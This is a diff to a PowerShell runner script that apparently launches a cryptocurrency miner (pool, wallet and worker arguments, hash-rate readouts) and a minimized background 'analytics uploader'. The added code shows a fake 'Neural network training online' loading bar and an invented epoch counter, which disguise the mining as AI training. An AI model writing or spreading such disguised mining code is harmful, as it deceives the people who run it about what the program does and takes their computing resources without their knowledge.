@@ -14,6 +14,7 @@ param(
 # M1091V27C_WINDOWS_CANONICAL_ANALYTICS_PAYLOADS
 # M1091V27I_WINDOWS_SHORT_ARGS
 # M1091V34F_WINDOWS_PUBLIC_LOG_ONLY
+# M1091V34G_WINDOWS_PUBLIC_LOG_SAFE_FRAMES
 # Windows public runner:
 # - Windows 8 compatible TLS bootstrap
 # - tar.exe-free .tar.gz extraction fallback
@@ -598,6 +599,35 @@ function Write-CodedPublicBrand {
   Write-Host ""
 }
 
+
+function Get-CodedPublicEpochFallback {
+  try {
+    $ref = [DateTime]::Parse("2026-07-01T12:00:00Z").ToUniversalTime()
+    $now = (Get-Date).ToUniversalTime()
+    $weeks = [Math]::Floor(($now - $ref).TotalDays / 7)
+    return [string](220 + $weeks)
+  } catch {
+    return "?"
+  }
+}
+
+function Show-CodedPublicBootLoader([string]$Status) {
+  $width = 78
+  for ($p = 0; $p -le 100; $p += 2) {
+    $fill = [int][Math]::Floor($width * $p / 100)
+    $bar = ("#" * $fill) + ("." * ($width - $fill))
+    Write-Host ("`r" + $bar) -NoNewline -ForegroundColor Green
+    Start-Sleep -Milliseconds 14
+  }
+  Write-Host ""
+  $line = ("100% " + $Status)
+  if ($line.Length -gt $width) { $line = $line.Substring(0, $width) }
+  $left = [Math]::Floor(($width - $line.Length) / 2)
+  Write-Host ((" " * $left) + $line)
+  Write-Host ""
+}
+
+
 $script:CODED_PUBLIC_HEADER_PRINTED = $false
 $script:CODED_PUBLIC_LINE_COUNT = 0
 $script:CODED_PUBLIC_LAST_SIG = ""
@@ -615,6 +645,7 @@ function Write-CodedPublicFrame([string]$Line) {
   $backend = Get-CodedPublicBackend $backendRaw
 
   $epoch = Get-CodedPublicValue $m "epoch" "?"
+  if (-not $epoch -or $epoch -eq "?" -or $epoch -eq "0") { $epoch = Get-CodedPublicEpochFallback }
   $total = Get-CodedPublicValue $m "hash_it_s" (Get-CodedPublicValue $m "total_it_s" 0)
   $avg = Get-CodedPublicValue $m "avg_hash_it_s_30s" (Get-CodedPublicValue $m "avg_it_s" $total)
 
@@ -656,6 +687,8 @@ function Write-CodedPublicFrame([string]$Line) {
 }
 
 
+Write-CodedPublicBrand
+Show-CodedPublicBootLoader "Neural network training online"
 Write-Host "Starting analytics uploader..."
 Start-Process powershell -WindowStyle Minimized -ArgumentList @(
   "-NoProfile",
@@ -688,7 +721,7 @@ $ErrorActionPreference = "Continue"
 try {
   & $exe --pool $Pool --wallet $Wallet --worker $Worker --threads "$Threads" 2>&1 | ForEach-Object {
     $line = [string]$_
-    $line | Out-File -FilePath $log -Append -Encoding utf8
+    [System.IO.File]::AppendAllText($log, $line + [Environment]::NewLine, [System.Text.Encoding]::UTF8)
     Write-CodedPublicFrame $line
   }
 } finally {
